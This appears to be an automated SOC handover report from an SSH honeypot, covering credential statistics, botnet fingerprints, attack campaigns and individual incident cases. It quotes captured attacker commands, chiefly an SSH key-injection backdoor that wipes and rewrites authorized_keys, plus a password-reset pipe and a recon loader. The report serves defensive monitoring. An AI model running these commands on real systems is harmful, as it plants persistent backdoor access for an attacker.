# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-17 |
| **Generated At** | 2026-10-17T14:37:37Z |
| **Shift Time** | 14:37 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **273** |
| Confirmed Threats | **233** |
| False Positives Filtered | **40** (14.6%) |
| Unique Attacker IPs | **179** |
| Countries of Origin | **43** |
| High Severity Cases | **129** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **144** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **4030** |
| Unique Credential Pairs | **3864** |
| Unique Usernames | **1926** |
| Unique Passwords | **1324** |
| Successful Auth Pairs | **3948** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 118 |
| `345gs5662d34` | 57 |
| `support` | 27 |
| `admin` | 19 |
| `ubuntu` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 59 |
| `345gs5662d34` | 57 |
| `support` | 25 |
| `admin` | 12 |
| `Host: 129.80.119.236:23` | 12 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 57 |
| `support` | `support` | 24 |
| `root` | `3245gs5662d34` | 16 |
| `admin` | `admin` | 10 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `176.53.159.196` | 2026-10-17T00:55:53 |
| `smtp` | `smtp587` | `10.0.0.73` | 2026-10-17T00:56:00 |
| `zebra` | `zebra` | `10.0.0.73` | 2026-10-17T00:57:51 |
| `elastic` | `elastic!@#` | `10.0.0.73` | 2026-10-17T00:59:40 |
| `elastic` | `elastic@123` | `10.0.0.73` | 2026-10-17T01:01:37 |
| `root` | `password` | `193.112.192.91` | 2026-10-17T01:01:49 |
| `root` | `admin` | `193.112.192.91` | 2026-10-17T01:01:57 |
| `root` | `oracle` | `193.112.192.91` | 2026-10-17T01:02:00 |
| `root` | `Oracle@2024` | `193.112.192.91` | 2026-10-17T01:02:06 |
| `root` | `OracleCloud` | `193.112.192.91` | 2026-10-17T01:02:13 |
| `root` | `oci` | `193.112.192.91` | 2026-10-17T01:02:16 |
| `root` | `opc` | `193.112.192.91` | 2026-10-17T01:02:20 |
| `root` | `P@ssw0rd` | `193.112.192.91` | 2026-10-17T01:02:56 |
| `root` | `ubuntu` | `193.112.192.91` | 2026-10-17T01:03:06 |
| `root` | `Hackers` | `193.112.192.91` | 2026-10-17T01:03:08 |
| `root` | `Contabo123` | `193.112.192.91` | 2026-10-17T01:03:23 |
| `root` | `toor` | `193.112.192.91` | 2026-10-17T01:03:27 |
| `opc` | `password` | `193.112.192.91` | 2026-10-17T01:03:31 |
| `opc` | `oracle` | `193.112.192.91` | 2026-10-17T01:03:34 |
| `opc` | `Oracle@2024` | `193.112.192.91` | 2026-10-17T01:03:37 |
_… 3928 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **273** |
| Sessions with Fingerprint | **27** |
| Unique HASSH Fingerprints | **27** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 101 |
| Go SSH scanner | 44 |
| Paramiko (Python) | 6 |
| Unknown | 6 |
| AsyncSSH (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 79 | 45 |
| `0a07365cc01f...` | Generic scanner | 9 | 8 |
| `084386fa7ae5...` | Mirai/variant | 8 | 8 |
| `eff4c24daffc...` | Modern SSH client | 7 | 1 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 79 | 45 | Mirai/variant |
| `95420f9d932d...` | libssh | 14 | 8 | — |
| `0a07365cc01f...` | Go SSH scanner | 9 | 8 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 8 | 8 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `03a80b21afa8...` | libssh | 5 | 3 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 4 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **17** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 34 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 35 | 35 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "report\nntw1ye85i6W6\nntw1ye85i6W6"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `196.189.155.89`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`, `80.94.92.55`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `211.106.133.202`, `187.216.224.85`, `125.212.251.7`, `156.236.66.15`, `87.106.63.76`, `58.220.10.131`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **179** |
| Unique ASNs | **83** |
| High-Risk ASNs | **63** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 37 | HIGH |
| `AS396982` | Google LLC | 13 | HIGH |
| `AS14061` | DigitalOcean, LLC | 8 | HIGH |
| `AS398324` | Censys, Inc. | 7 | HIGH |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS198364` | BANATSYNC SRL | 6 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |
| `AS200651` | FlokiNET ehf | 4 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (126)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-392f2c318bc0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-17 00:55 |
| **Last Seen** | 2026-10-17 00:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:55:52` | `cowrie.session.connect` |
| `2026-10-17 00:55:52` | `cowrie.client.version` |
| `2026-10-17 00:55:52` | `cowrie.client.kex` |
| `2026-10-17 00:55:53` | `cowrie.login.success` |
| `2026-10-17 00:55:53` | `cowrie.direct-tcpip.request` |
| `2026-10-17 00:55:53` | `cowrie.direct-tcpip.data` |
| `2026-10-17 00:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd9c0ad1b504

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-10-17 01:01 |
| **Last Seen** | 2026-10-17 01:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 01:01:47` | `cowrie.session.connect` |
| `2026-10-17 01:01:47` | `cowrie.client.version` |
| `2026-10-17 01:01:48` | `cowrie.client.kex` |
| `2026-10-17 01:01:49` | `cowrie.login.success` |
| `2026-10-17 01:01:50` | `cowrie.session.params` |
| `2026-10-17 01:01:50` | `cowrie.command.input` |
| `2026-10-17 01:01:50` | `cowrie.log.closed` |
| `2026-10-17 01:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-159c2ef65201

| Field | Detail |
|---|---|
| **Source IP** | `45.207.209[.]16` |
| **First Seen** | 2026-10-17 01:09 |
| **Last Seen** | 2026-10-17 01:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 01:09:15` | `cowrie.session.connect` |
| `2026-10-17 01:09:15` | `cowrie.client.version` |
| `2026-10-17 01:09:15` | `cowrie.client.kex` |
| `2026-10-17 01:09:16` | `cowrie.login.success` |
| `2026-10-17 01:09:17` | `cowrie.session.params` |
| `2026-10-17 01:09:17` | `cowrie.command.input` |
| `2026-10-17 01:09:17` | `cowrie.command.failed` |
| `2026-10-17 01:09:18` | `cowrie.log.closed` |
| `2026-10-17 01:09:18` | `cowrie.session.params` |
| `2026-10-17 01:09:18` | `cowrie.command.input` |
| `2026-10-17 01:09:19` | `cowrie.session.file_download` |
| `2026-10-17 01:09:19` | `cowrie.log.closed` |
| `2026-10-17 01:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.209[.]16` to AbuseIPDB if not already reported
- [ ] Block `45.207.209[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d51a4f5eae10

| Field | Detail |
|---|---|
| **Source IP** | `45.207.209[.]16` |
| **First Seen** | 2026-10-17 01:09 |
| **Last Seen** | 2026-10-17 01:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 01:09:19` | `cowrie.session.connect` |
| `2026-10-17 01:09:19` | `cowrie.client.version` |
| `2026-10-17 01:09:19` | `cowrie.client.kex` |
| `2026-10-17 01:09:20` | `cowrie.login.success` |
| `2026-10-17 01:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.209[.]16` to AbuseIPDB if not already reported
- [ ] Block `45.207.209[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa9f1ea84ab9

| Field | Detail |
|---|---|
| **Source IP** | `202.145.0[.]18` |
| **First Seen** | 2026-10-17 01:13 |
| **Last Seen** | 2026-10-17 01:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 01:13:15` | `cowrie.session.connect` |
| `2026-10-17 01:13:15` | `cowrie.client.version` |
| `2026-10-17 01:13:15` | `cowrie.client.kex` |
| `2026-10-17 01:13:16` | `cowrie.login.success` |
| `2026-10-17 01:13:17` | `cowrie.session.params` |
| `2026-10-17 01:13:17` | `cowrie.command.input` |
| `2026-10-17 01:13:17` | `cowrie.command.failed` |
| `2026-10-17 01:13:18` | `cowrie.log.closed` |
| `2026-10-17 01:13:19` | `cowrie.session.params` |
| `2026-10-17 01:13:19` | `cowrie.command.input` |
| `2026-10-17 01:13:19` | `cowrie.session.file_download` |
| `2026-10-17 01:13:19` | `cowrie.log.closed` |
| `2026-10-17 01:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.145.0[.]18` to AbuseIPDB if not already reported
- [ ] Block `202.145.0[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b766733ab27

| Field | Detail |
|---|---|
| **Source IP** | `202.145.0[.]18` |
| **First Seen** | 2026-10-17 01:13 |
| **Last Seen** | 2026-10-17 01:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 01:13:19` | `cowrie.session.connect` |
| `2026-10-17 01:13:19` | `cowrie.client.version` |
| `2026-10-17 01:13:19` | `cowrie.client.kex` |
| `2026-10-17 01:13:20` | `cowrie.login.success` |
| `2026-10-17 01:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.145.0[.]18` to AbuseIPDB if not already reported
- [ ] Block `202.145.0[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e97549587c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-10-17 01:13 |
| **Last Seen** | 2026-10-17 01:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 01:13:29` | `cowrie.session.connect` |
| `2026-10-17 01:13:30` | `cowrie.client.version` |
| `2026-10-17 01:13:30` | `cowrie.client.kex` |
| `2026-10-17 01:13:32` | `cowrie.login.success` |
| `2026-10-17 01:13:34` | `cowrie.session.params` |
| `2026-10-17 01:13:34` | `cowrie.command.input` |
| `2026-10-17 01:13:34` | `cowrie.command.input` |
| `2026-10-17 01:13:34` | `cowrie.command.input` |
| `2026-10-17 01:13:34` | `cowrie.command.input` |
| `2026-10-17 01:13:34` | `cowrie.command.input` |
| `2026-10-17 01:13:34` | `cowrie.command.success` |
| `2026-10-17 01:13:34` | `cowrie.command.input` |
| `2026-10-17 01:13:34` | `cowrie.command.input` |
| `2026-10-17 01:13:34` | `cowrie.command.input` |
| `2026-10-17 01:13:34` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04bad0efdd28

| Field | Detail |
|---|---|
| **Source IP** | `20.102.98[.]53` |
| **First Seen** | 2026-10-17 01:22 |
| **Last Seen** | 2026-10-17 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 01:22:04` | `cowrie.session.connect` |
| `2026-10-17 01:22:04` | `cowrie.client.version` |
| `2026-10-17 01:22:04` | `cowrie.client.kex` |
| `2026-10-17 01:22:04` | `cowrie.login.success` |
| `2026-10-17 01:22:05` | `cowrie.session.params` |
| `2026-10-17 01:22:05` | `cowrie.command.input` |
| `2026-10-17 01:22:05` | `cowrie.command.failed` |
| `2026-10-17 01:22:05` | `cowrie.log.closed` |
| `2026-10-17 01:22:06` | `cowrie.session.params` |
| `2026-10-17 01:22:06` | `cowrie.command.input` |
| `2026-10-17 01:22:06` | `cowrie.session.file_download` |
| `2026-10-17 01:22:06` | `cowrie.log.closed` |
| `2026-10-17 01:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.102.98[.]53` to AbuseIPDB if not already reported
- [ ] Block `20.102.98[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58e39324eb52

| Field | Detail |
|---|---|
| **Source IP** | `20.102.98[.]53` |
| **First Seen** | 2026-10-17 01:22 |
| **Last Seen** | 2026-10-17 01:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 01:22:06` | `cowrie.session.connect` |
| `2026-10-17 01:22:06` | `cowrie.client.version` |
| `2026-10-17 01:22:06` | `cowrie.client.kex` |
| `2026-10-17 01:22:06` | `cowrie.login.success` |
| `2026-10-17 01:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.102.98[.]53` to AbuseIPDB if not already reported
- [ ] Block `20.102.98[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea7032312dec

| Field | Detail |
|---|---|
| **Source IP** | `58.220.10[.]131` |
| **First Seen** | 2026-10-17 01:29 |
| **Last Seen** | 2026-10-17 01:29 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 01:29:13` | `cowrie.session.connect` |
| `2026-10-17 01:29:13` | `cowrie.client.version` |
| `2026-10-17 01:29:13` | `cowrie.client.kex` |
| `2026-10-17 01:29:14` | `cowrie.login.success` |
| `2026-10-17 01:29:15` | `cowrie.session.params` |
| `2026-10-17 01:29:15` | `cowrie.command.input` |
| `2026-10-17 01:29:15` | `cowrie.command.failed` |
| `2026-10-17 01:29:15` | `cowrie.log.closed` |
| `2026-10-17 01:29:17` | `cowrie.session.params` |
| `2026-10-17 01:29:17` | `cowrie.command.input` |
| `2026-10-17 01:29:18` | `cowrie.session.file_download` |
| `2026-10-17 01:29:18` | `cowrie.log.closed` |
| `2026-10-17 01:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.220.10[.]131` to AbuseIPDB if not already reported
- [ ] Block `58.220.10[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8fdc5b4f6ee

| Field | Detail |
|---|---|
| **Source IP** | `58.220.10[.]131` |
| **First Seen** | 2026-10-17 01:29 |
| **Last Seen** | 2026-10-17 01:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 01:29:31` | `cowrie.session.connect` |
| `2026-10-17 01:29:37` | `cowrie.client.version` |
| `2026-10-17 01:29:37` | `cowrie.client.kex` |
| `2026-10-17 01:29:38` | `cowrie.login.success` |
| `2026-10-17 01:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.220.10[.]131` to AbuseIPDB if not already reported
- [ ] Block `58.220.10[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0045b2df5c6

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-10-17 01:38 |
| **Last Seen** | 2026-10-17 01:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 01:38:09` | `cowrie.session.connect` |
| `2026-10-17 01:38:09` | `cowrie.client.version` |
| `2026-10-17 01:38:10` | `cowrie.client.kex` |
| `2026-10-17 01:38:10` | `cowrie.login.success` |
| `2026-10-17 01:38:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7943165333ea

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-10-17 02:31 |
| **Last Seen** | 2026-10-17 02:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
